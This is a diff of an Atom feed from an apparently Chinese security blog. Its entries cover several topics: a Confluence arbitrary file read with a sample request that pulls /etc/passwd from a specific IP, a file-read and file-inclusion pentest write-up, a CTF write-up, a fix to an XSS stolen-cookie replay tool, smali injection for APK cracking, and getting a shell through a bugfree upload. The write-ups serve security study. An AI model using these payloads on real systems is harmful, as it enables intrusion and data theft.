     <link href="http://xdxd.love/2016/06/03/confluence%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     <id>http://xdxd.love/2016/06/03/confluence任意文件读取漏洞分析/</id>
     <published>2016-06-03T09:29:03.000Z</published>
     <updated>2016-09-23T05:46:48.000Z</updated>
+    
     <content type="html"><![CDATA[<h2 id="poc">poc</h2><p><a href="https://www.exploit-db.com/exploits/39170/" target="_blank" rel="external">exploit-db</a>中提供了poc，可以读取confluence配置文件。后来跟漏洞发现者邮件沟通得知他也是通过黑盒测试的方式发现这个漏洞的。<a href="http://zone.wooyun.org/content/27104" target="_blank" rel="external">有关Atlassian Confluence信息泄露漏洞的尝试</a>中分析了使用了../../无法跳到系统根目录，但是可以使用file://协议读取系统文件。所以这个漏洞的危害是读取任意系统文件。</p>
 <h2 id="漏洞分析">漏洞分析</h2><p>经过fuzz发现某些特殊字符会导致系统500，报错。比如<code>%0a</code></p>
 <pre><code><span class="symbol">http:</span>/<span class="regexp">/115.159.160.174:8099/spaces</span><span class="regexp">/viewdefaultdecorator.action?decoratorName=file:/</span><span class="regexp">//etc</span><span class="regexp">/passwdd%0a</span>
@@ -744,22 +811,27 @@ cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu
 <p>不知道为什么不支持http。不知道是否做了限制。想尝试通过https302到http测试。但是默认需要https证书正确才可以访问。尝试通过在java添加自签名证书失败。</p>
 <h1 id="参考资料">参考资料</h1><p><a href="https://www.exploit-db.com/exploits/39170/" target="_blank" rel="external">https://www.exploit-db.com/exploits/39170/</a><br><a href="http://zone.wooyun.org/content/27104" target="_blank" rel="external">http://zone.wooyun.org/content/27104</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-0207331" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0207331</a></p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<h2 id="poc">poc</h2><p><a href="https://www.exploit-db.com/exploits/39170/" target="_blank" rel="external">exploit-db</a>中提供了poc，可以读取conflu]]>
+    
+      &lt;h2 id=&quot;poc&quot;&gt;poc&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/39170/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;exploit-db&lt;/a&gt;中提供了poc，可以读取conflu
+    
     </summary>
     
-      <category term="java" scheme="http://xdxd.love/tags/java/"/>
-    
       <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+      <category term="java" scheme="http://xdxd.love/tags/java/"/>
     
   </entry>
   
   <entry>
-    <title><![CDATA[一个任意文件读取漏洞记录]]></title>
+    <title>一个任意文件读取漏洞记录</title>
     <link href="http://xdxd.love/2016/05/23/%E4%B8%80%E4%B8%AA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     <id>http://xdxd.love/2016/05/23/一个任意文件读取漏洞分析/</id>
     <published>2016-05-23T07:27:05.000Z</published>
     <updated>2016-05-26T14:05:32.000Z</updated>
+    
     <content type="html"><![CDATA[<h1 id="黑盒测试">黑盒测试</h1><p>黑盒测试发现某个接口存在任意文件读取的漏洞。<br><img src="/images/wenjianduqu1.gif" alt=""><br>首选判断是文件读取还是文件包含，因为file_get_content(“/etc/passwd”)和include(“/etc/passwd”)黑盒来看的表现可能一样。而文件包含是可以getshell的，文件读取就只能读取文件。可以通过尝试读取相对路径的脚本文件，比如<code>/read.php?file=read.php</code>的方式，如果可以读取到文件源码，说明是文件读取，如果不能读取到文件源码说明是文件包含。</p>
 <h1 id="文件读取">文件读取</h1><p>服务器上有价值的文件主要可以分为3类。通用的系统/应用配置文件，个性化的文件以及web应用的源码文件。而想要读取到一个文件只需要知道这个文件的绝对路径或者相对路径就可以了。</p>
 <p>把web应用的源码单独出来是觉得应用源码可以很方便的通过相对路径获取到，不需要费劲得到源码的绝对路径。系统的通用配置文件比如</p>
@@ -876,20 +948,25 @@ private <span class="keyword">function</span> base_class(<span class="variable">
 <h1 id="修复方案">修复方案</h1><p>白名单用户的输入就可以了。</p>
 <h1 id="参考资料">参考资料</h1><p><a href="http://zone.wooyun.org/content/27434" target="_blank" rel="external">http://zone.wooyun.org/content/27434</a><br><a href="https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/" target="_blank" rel="external">https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/</a></p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<h1 id="黑盒测试">黑盒测试</h1><p>黑盒测试发现某个接口存在任意文件读取的漏洞。<br><img src="/images/wenjianduqu1.gif" alt=""><br>首选判断是文件读取还是文件包含，因为file_get_content(“/etc/]]>
+    
+      &lt;h1 id=&quot;黑盒测试&quot;&gt;黑盒测试&lt;/h1&gt;&lt;p&gt;黑盒测试发现某个接口存在任意文件读取的漏洞。&lt;br&gt;&lt;img src=&quot;/images/wenjianduqu1.gif&quot; alt=&quot;&quot;&gt;&lt;br&gt;首选判断是文件读取还是文件包含，因为file_get_content(“/etc/
+    
     </summary>
     
       <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
+    
   </entry>
   
   <entry>
-    <title><![CDATA[2016 CCTF writeup之萝莉之旅]]></title>
+    <title>2016 CCTF writeup之萝莉之旅</title>
     <link href="http://xdxd.love/2016/05/03/2016-CCTF%E4%B9%8B%E8%90%9D%E8%8E%89%E4%B9%8B%E6%97%85/"/>
     <id>http://xdxd.love/2016/05/03/2016-CCTF之萝莉之旅/</id>
     <published>2016-05-03T03:33:35.000Z</published>
     <updated>2016-05-03T08:45:16.000Z</updated>
+    
     <content type="html"><![CDATA[<p><img src="/images/cctf4.png" alt=""></p>
 <h1 id="CCTF感受">CCTF感受</h1><p>周六花了一天时间做了下CCTF的pentest。还是有不少有意思的收获。这个名字叫pentest，而不是web，感觉也是花了心思的，感谢花时间精力准备的CCTF。loli1，loli2侥幸拿了一血，先装个逼。<br><img src="/images/cctf1.png" alt=""></p>
 <h1 id="loli之旅">loli之旅</h1><p>打开首页萌了一脸，羞羞的图片，果然是loli.club啊。右键看了一下源码，除了一个注释貌似没有啥其他的信息了。</p>
@@ -997,19 +1074,24 @@ PORT=<span class="number">53</span>
 <span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
     app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8765</span>,threaded=<span class="keyword">True</span>)
 </code></pre>]]></content>
+    
     <summary type="html">
-    <![CDATA[<p><img src="/images/cctf4.png" alt=""></p>
-<h1 id="CCTF感受">CCTF感受</h1><p>周六花了一天时间做了下CCTF的pentest。还是有不少有意思的收获。这个名字叫pentest，而不是web，感觉也是花了心思的，]]>
+    
+      &lt;p&gt;&lt;img src=&quot;/images/cctf4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h1 id=&quot;CCTF感受&quot;&gt;CCTF感受&lt;/h1&gt;&lt;p&gt;周六花了一天时间做了下CCTF的pentest。还是有不少有意思的收获。这个名字叫pentest，而不是web，感觉也是花了心思的，
+    
     </summary>
+    
     
   </entry>
   
   <entry>
-    <title><![CDATA[XSScookie利用工具cookie-hacker修改版]]></title>
+    <title>XSScookie利用工具cookie-hacker修改版</title>
     <link href="http://xdxd.love/2016/04/12/XSScookie%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7cookie-hacker%E4%BF%AE%E6%94%B9%E7%89%88/"/>
     <id>http://xdxd.love/2016/04/12/XSScookie利用工具cookie-hacker修改版/</id>
     <published>2016-04-12T07:49:06.000Z</published>
     <updated>2016-04-12T07:58:36.000Z</updated>
+    
     <content type="html"><![CDATA[<p><a href="http://evilcos.me/?p=366" target="_blank" rel="external">cookiehacker</a>余弦大神些的cookie利用工具，可以方便的把xss收到的cookie写入本地。</p>
 <p><img src="http://evilcos.me/wp-content/uploads/2013/10/123.jpg" alt=""><br>使用过程中遇到一个小问题。就是一个字段value值是base64编码的。里面有=号。使用cookiehacker写入的时候把等号自动给去掉了。</p>
 <p>查看源码发现是这么写的。</p>
@@ -1019,23 +1101,28 @@ v = c.split(<span class="string">'='</span>)[<span class="number">1</span>].repl
 <pre><code>k = c.<span class="keyword">substring</span>(<span class="number">0</span>,c.indexOf(<span class="string">'='</span>)).replace(/^\s+|\s+<span class="variable">$/</span>g, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>);
 v = c.<span class="keyword">substring</span>(c.indexOf(<span class="string">'='</span>)+ <span class="number">1</span>).replace(/^\s+|\s+<span class="variable">$/</span>g, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>); 
 </code></pre>]]></content>
+    
     <summary type="html">
-    <![CDATA[<p><a href="http://evilcos.me/?p=366" target="_blank" rel="external">cookiehacker</a>余弦大神些的cookie利用工具，可以方便的把xss收到的cookie写入本地。</p>
-<p><img sr]]>
+    
+      &lt;p&gt;&lt;a href=&quot;http://evilcos.me/?p=366&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;cookiehacker&lt;/a&gt;余弦大神些的cookie利用工具，可以方便的把xss收到的cookie写入本地。&lt;/p&gt;
+&lt;p&gt;&lt;img sr
+    
     </summary>
     
-      <category term="xss" scheme="http://xdxd.love/tags/xss/"/>
-    
       <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="xss" scheme="http://xdxd.love/tags/xss/"/>
     
   </entry>
   
   <entry>
-    <title><![CDATA[smali插桩调试apk]]></title>
+    <title>smali插桩调试apk</title>
     <link href="http://xdxd.love/2016/04/08/smali%E6%8F%92%E6%A1%A9%E8%B0%83%E8%AF%95apk/"/>
     <id>http://xdxd.love/2016/04/08/smali插桩调试apk/</id>
     <published>2016-04-08T01:45:16.000Z</published>
     <updated>2016-04-08T02:28:55.000Z</updated>
+    
     <content type="html"><![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://drops.wooyun.org/papers/6045" target="_blank" rel="external">安卓动态调试七种武器之长生剑 - Smali Instrumentation</a></p>
 <p><a href="http://www.52pojie.cn/thread-255754-1-1.html" target="_blank" rel="external">Smali注入之打造属于自己的安卓crack利器</a></p>
 <h1 id="利用代码">利用代码</h1><pre><code><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lcrack;</span>
@@ -1051,20 +1138,25 @@ v = c.<span class="keyword">substring</span>(c.indexOf(<span class="string">'='<
    <span class="instruction"> return-void
 </span><span class="keyword">.end method</span>
 </code></pre>]]></content>
+    
     <summary type="html">
-    <![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://drops.wooyun.org/papers/6045" target="_blank" rel="external">安卓动态调试七种武器之长生剑 - Smali Instrumentatio]]>
+    
+      &lt;h1 id=&quot;参考资料&quot;&gt;参考资料&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://drops.wooyun.org/papers/6045&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;安卓动态调试七种武器之长生剑 - Smali Instrumentatio
+    
     </summary>
     
       <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
     
+    
   </entry>
   
   <entry>
-    <title><![CDATA[logcat使用指南]]></title>
+    <title>logcat使用指南</title>
     <link href="http://xdxd.love/2016/04/07/logcat%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
     <id>http://xdxd.love/2016/04/07/logcat使用指南/</id>
     <published>2016-04-07T06:08:27.000Z</published>
     <updated>2016-04-07T07:36:37.000Z</updated>
+    
     <content type="html"><![CDATA[<p>一共5中日志的输出方式：</p>
 <p>android.util.Log：提供了五种输出日志的方法</p>
 <p>Log.e(), Log.w(), Log.i(), Log.d(), Log.v()</p>
@@ -1096,34 +1188,43 @@ W/System.err(<span class="number">24780</span>):    <span class="keyword">at</sp
 <p><a href="http://www.cnblogs.com/imouto/archive/2012/12/11/filtering-adb-logcat-output.html" target="_blank" rel="external">http://www.cnblogs.com/imouto/archive/2012/12/11/filtering-adb-logcat-output.html</a></p>
 <p><a href="https://wiki.cyanogenmod.org/w/Doc:_debugging_with_logcat/zh-cn" target="_blank" rel="external">https://wiki.cyanogenmod.org/w/Doc:_debugging_with_logcat/zh-cn</a></p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<p>一共5中日志的输出方式：</p>
-<p>android.util.Log：提供了五种输出日志的方法</p>
-<p>Log.e(), Log.w(), Log.i(), Log.d(), Log.v()</p>
-<p>ERROR, WARN, INFO, DEBUG, VER]]>
+    
+      &lt;p&gt;一共5中日志的输出方式：&lt;/p&gt;
+&lt;p&gt;android.util.Log：提供了五种输出日志的方法&lt;/p&gt;
+&lt;p&gt;Log.e(), Log.w(), Log.i(), Log.d(), Log.v()&lt;/p&gt;
+&lt;p&gt;ERROR, WARN, INFO, DEBUG, VER
+    
     </summary>
     
       <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
     
+    
   </entry>
   
   <entry>
-    <title><![CDATA[bugfree任意文件上传漏洞]]></title>
+    <title>bugfree任意文件上传漏洞</title>
     <link href="http://xdxd.love/2016/03/28/bugfree%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%BC%A4%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
     <id>http://xdxd.love/2016/03/28/bugfree任意文件伤上传漏洞/</id>
     <published>2016-03-28T08:57:49.000Z</published>
     <updated>2016-03-28T09:15:37.000Z</updated>
+    
     <content type="html"><![CDATA[<h1 id="漏洞详情">漏洞详情</h1><p><a href="http://wooyun.org/bugs/wooyun-2010-023919" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-023919</a><br><a href="http://wooyun.org/bugs/wooyun-2010-074519" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-074519</a></p>
 <p>最近渗透过程中遇到一个3.0.2版本的bugfree。利用这个上传获得shell。这个上传其实并不鸡肋。如果bugfree这种系统一般都会存在弱口令，而上传的目录文件名只有3位随机。所以如果可以解析的话就可以getshell。新版本中设置文件目录为bugFile。位于bugfree程序文件的上一级目录。如果运维配置web目录的时候根目录为bugfree目录上一级，也会存在安全问题。</p>
 <p><img src="/images/bugfree1.png" alt=""></p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<h1 id="漏洞详情">漏洞详情</h1><p><a href="http://wooyun.org/bugs/wooyun-2010-023919" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2]]>
+    
+      &lt;h1 id=&quot;漏洞详情&quot;&gt;漏洞详情&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2010-023919&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://wooyun.org/bugs/wooyun-2
+    
     </summary>
     
-      <category term="bugfree" scheme="http://xdxd.love/tags/bugfree/"/>
-    
       <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="bugfree" scheme="http://xdxd.love/tags/bugfree/"/>
     
   </entry>
   
